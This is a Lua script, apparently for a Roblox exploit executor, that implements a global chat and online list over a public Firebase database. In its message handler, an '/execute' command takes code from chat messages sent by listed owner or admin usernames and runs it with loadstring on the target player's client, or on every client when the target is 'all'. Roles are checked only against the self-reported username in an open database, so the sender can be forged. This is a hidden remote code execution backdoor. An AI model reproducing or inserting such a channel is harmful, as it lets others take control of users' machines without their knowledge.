---------------------------------------------------
-- LOGIC & VARIABLES
---------------------------------------------------
local FIREBASE_URL = "https://myfirstproject-e1354-default-rtdb.firebaseio.com/"
local PATH_MESSAGES = "globalchat/messages.json"
local PATH_ONLINE = "globalchat/online/"

local startTime = os.time()
local lastSend = 0
local COOLDOWN = 1
local MAX_UI_MESSAGES = 30 

local running = true
local messageObjects = {}
local seen = {}
local onlineObjects = {} 

-- ==========================================
-- HỆ THỐNG PHÂN QUYỀN (HIERARCHY)
-- ==========================================
local OWNERS = {
    ["hoang_huy1k9"] = true -- 54hz
}

local ADMINS = {
    ["Hoang_mai0"] = true,
    ["rypzRXcHVG"] = true   -- ROBLOX777
}

local function getRole(username)
    if OWNERS[username] then return "OWNER" end
    if ADMINS[username] then return "ADMIN" end
    return "USER"
end

---------------------------------------------------
-- UTIL
---------------------------------------------------
local function now()
    return os.date("%H:%M", os.time())
end

local function isImage(msg)
    if typeof(msg) ~= "string" then return false end
    msg = msg:lower()
    return msg:match("^rbxassetid://%d+$") or msg:match("^https?://.+")
end

local function updateCooldown()
    local remain = math.max(0, COOLDOWN - (tick() - lastSend))
    label1:SetText("Chat Cooldown: " .. math.ceil(remain) .. "s")
end

local function getSenderPrefix(msg)
    local roleStr = ""
    local role = getRole(msg.username)
    
    if role == "OWNER" then
        roleStr = "🌟 [OWNER] "
    elseif role == "ADMIN" then
        roleStr = "👑 [ADMIN] "
    end
    
    return roleStr .. msg.displayName .. " (@" .. msg.username .. ") " .. now()
end

---------------------------------------------------
-- HỆ THỐNG ONLINE/OFFLINE (HEARTBEAT)
---------------------------------------------------
local function updateOnlineStatus()
    task.spawn(function()
        local myData = {
            displayName = LocalPlayer.DisplayName,
            username = LocalPlayer.Name,
            timestamp = os.time() 
        }
        http_request({
            Url = FIREBASE_URL .. PATH_ONLINE .. LocalPlayer.UserId .. ".json",
            Method = "PUT",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(myData)
        })
    end)

    local res = http_request({Url = FIREBASE_URL .. "globalchat/online.json", Method = "GET"})
    if not res or res.StatusCode ~= 200 then return end

    local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok or type(data) ~= "table" then data = {} end

    local currentOnline = {}
    local ownerCount = 0
    local adminCount = 0
    local userCount = 0

    for userId, user in pairs(data) do
        if type(user) == "table" and user.timestamp then
            if os.time() - user.timestamp <= 15 then
                currentOnline[userId] = user
                
                local role = getRole(user.username)
                if role == "OWNER" then ownerCount = ownerCount + 1
                elseif role == "ADMIN" then adminCount = adminCount + 1
                else userCount = userCount + 1 end
            else
                task.spawn(function()
                    http_request({
                        Url = FIREBASE_URL .. PATH_ONLINE .. userId .. ".json",
                        Method = "DELETE"
                    })
                end)
            end
        end
    end

    lblOwnerCount:SetText("[OWNER] - " .. ownerCount .. " online")
    lblAdminCount:SetText("[ADMIN] - " .. adminCount .. " online")
    lblUserCount:SetText("User - " .. userCount .. " online")

    for userId, user in pairs(currentOnline) do
        if not onlineObjects[userId] then
            local role = getRole(user.username)
            local formatName = user.displayName .. "(@" .. user.username .. ")"
            local p
            
            if role == "OWNER" then p = SOwner:CreateParagraph(formatName, "Đang hoạt động")
            elseif role == "ADMIN" then p = SAdmin:CreateParagraph(formatName, "Đang hoạt động")
            else p = SUser:CreateParagraph(formatName, "Đang hoạt động") end
            
            onlineObjects[userId] = { p = p }
        end
    end

    for userId, obj in pairs(onlineObjects) do
        if not currentOnline[userId] then
            pcall(function() if obj.p and obj.p.Destroy then obj.p:Destroy() end end)
            onlineObjects[userId] = nil 
        end
    end
end

Players.PlayerRemoving:Connect(function(plr)
    if plr == LocalPlayer then
        http_request({
            Url = FIREBASE_URL .. PATH_ONLINE .. LocalPlayer.UserId .. ".json",
            Method = "DELETE"
        })
    end
end)

---------------------------------------------------
-- RENDER CHAT & COMMAND SYSTEM
---------------------------------------------------
local function createText(msg)
    local prefix = getSenderPrefix(msg)
    return STab1:CreateParagraph(prefix, msg.message)
end

local function createImage(msg)
    local prefix = getSenderPrefix(msg)
    local p = STab1:CreateParagraph(prefix, "")
    local ok = pcall(function() p:CreateImage(msg.message) end)
    if not ok then p:SetText(msg.message) end
    return p
end

local function addMessage(key, msg)
    if seen[key] then return end
    seen[key] = true

    -- COMMAND SYSTEM
    if msg.message:match("^/execute") then
        local senderRole = getRole(msg.username)
        
        -- Chỉ Owner hoặc Admin mới có quyền phát lệnh
        if senderRole == "OWNER" or senderRole == "ADMIN" then
            local target, code = msg.message:match('^/execute%s+"(.-)"%s+(.+)')
            if target and code then
                if code:sub(1, 1) == '"' and code:sub(-1, -1) == '"' then code = code:sub(2, -2) end
                
                -- Kiểm tra xem máy khách này có phải mục tiêu không
                local isTarget = (target == LocalPlayer.DisplayName or target == LocalPlayer.Name or target == "@" .. LocalPlayer.Name or target:lower() == "all")
                
                if isTarget then
                    local myRole = getRole(LocalPlayer.Name)
                    local canExecute = false
                    
                    -- KIỂM TRA THẨM QUYỀN NHẬN LỆNH
                    if senderRole == "OWNER" then
                        canExecute = true -- Owner được ra lệnh cho TẤT CẢ mọi người
                    elseif senderRole == "ADMIN" then
                        if myRole == "USER" then
                            canExecute = true -- Admin CHỈ được ra lệnh cho User
                        end
                    end
                    
                    if canExecute then
                        task.spawn(function()
                            local func, err = loadstring(code)
                            if func then pcall(func) else warn("Lỗi loadstring do sai cú pháp: ", err) end
                        end)
                        Window:SendNotification("Hệ Thống", "Đang thực thi lệnh từ " .. senderRole .. "!", 3)
                    end
                end
            end
        end
    end

    local obj = isImage(msg.message) and createImage(msg) or createText(msg)
    table.insert(messageObjects, obj)

    if #messageObjects > MAX_UI_MESSAGES then
        local oldestObj = table.remove(messageObjects, 1)
        pcall(function() if oldestObj and oldestObj.Destroy then oldestObj:Destroy() end end)
    end
end

---------------------------------------------------
-- THAO TÁC CƠ BẢN
---------------------------------------------------
local function clearChat()
    for _, v in ipairs(messageObjects) do
        pcall(function() if v and v.Destroy then v:Destroy() end end)
    end
    messageObjects = {}
    startTime = os.time()
end

local function sendMessage(text)
    text = tostring(text or "")
    if text == "" then return end
    if tick() - lastSend < COOLDOWN then return end
    
    lastSend = tick()
    updateCooldown()

    local payload = {
        displayName = LocalPlayer.DisplayName,
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        message = text,
        timestamp = os.time()
    }

    http_request({
        Url = FIREBASE_URL .. PATH_MESSAGES,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

local function sendImage(id)
    id = tostring(id or "")
    local valid = id:lower():match("^rbxassetid://%d+$") or id:lower():match("^https?://.+")
    if not valid then return end
    if tick() - lastSend < COOLDOWN then return end
    
    lastSend = tick()
    updateCooldown()

    local payload = {
        displayName = LocalPlayer.DisplayName,
        username = LocalPlayer.Name,
        userId = LocalPlayer.UserId,
        message = id,
        timestamp = os.time()
    }

    http_request({
        Url = FIREBASE_URL .. PATH_MESSAGES,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

local function fetch()
    local fetchUrl = FIREBASE_URL .. PATH_MESSAGES .. '?orderBy="$key"&limitToLast=20'
    local res = http_request({Url = fetchUrl, Method = "GET"})

    if not res or res.StatusCode ~= 200 then return end

    local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok or type(data) ~= "table" then return end

    local newMessages = {}
    for k, v in pairs(data) do
        if type(v) == "table" and v.timestamp and v.timestamp >= startTime then
            table.insert(newMessages, {key = k, msg = v})
        end
    end

    table.sort(newMessages, function(a, b) return a.msg.timestamp < b.msg.timestamp end)

    for _, item in ipairs(newMessages) do
        addMessage(item.key, item.msg)
    end
end

